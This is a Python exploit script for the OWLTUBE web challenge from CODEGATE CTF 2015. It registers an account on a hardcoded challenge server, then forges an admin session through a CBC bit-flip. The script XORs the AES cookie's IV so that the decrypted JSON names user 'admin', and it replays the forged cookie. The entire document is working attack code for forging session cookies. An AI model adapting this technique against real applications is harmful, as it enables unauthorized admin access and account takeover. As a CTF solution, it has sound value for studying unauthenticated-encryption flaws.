#!/usr/bin/python
#
# CODEGATE General CTF 2015
# OWLTUBE (WEB/400) Exploit
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import requests
from Crypto.Cipher import AES

BS = AES.block_size

class exploit:
	def __init__(self):
		self.r = None
		self.cookies = None
		return

	def getAuthcookie(self):
		if(self.cookies):
			return self.cookies['auth']
		else:
			return None

	def login(self, url, username, password):
		payload = {'user': username, 'pw': password}
		self.r = requests.post(url + '/login', data=payload)
		self.cookies = self.r.cookies
		return

	def register(self, url, username, password, email):
		payload = {'user': username, 'pw': password, 'email': email}
		self.r = requests.post(url + '/register', data=payload)
		self.cookies = self.r.cookies
		return

	def visit(self, url, authcookie):
		cookie = {'auth': authcookie}
		self.r = requests.get(url, cookies=cookie)
		return (self.r.text, self.r.status_code)

email = "x@x"
username = "x"
password = "admin"

url = 'http://54.64.164.100:5555'

sploit = exploit()

sploit.register(url, username, password, email)
sploit.login(url, username, password)

cookie = sploit.getAuthcookie()
(iv, e) = (cookie.decode('base64')[:BS], cookie.decode('base64')[BS:])

print "[+]Cookie: [%s]" % cookie
print "[+]IV: [%s]" % iv.encode('hex')
print "[+]Ciphertext: [%s]" % e.encode('hex')

plaintext = '{"u": "x", "pw": "admin"}'
targetext = '{"u":  "x", "u": "admin"}'

iv2 = list(iv)
for i in range(0, 16):
	iv2[i] = chr(ord(plaintext[i]) ^ ord(iv2[i]) ^ ord(targetext[i]))

iv2 = "".join(iv2)

cookie = (iv2 + e).encode("base64").replace("\n", "")

(t, s) = sploit.visit(url, cookie)

print t